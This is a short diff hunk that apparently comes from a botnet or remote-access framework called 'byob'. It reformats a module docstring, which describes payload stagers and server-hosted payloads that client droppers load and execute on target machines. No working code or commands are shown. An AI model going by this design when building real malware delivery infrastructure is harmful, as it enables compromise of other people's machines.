@@ -122,9 +122,7 @@ byob.modules
     package containing payload stagers created by the client generator along
     with the main payloads, which are hosted locally by the server (rather
     than uploaded to Pastebin to be hosted there anonymously) for the client
-    droppers to load & execute on target host machines
-
-"""
+    droppers to load & execute on target host machines"""
 
 def __get_all():
     import os
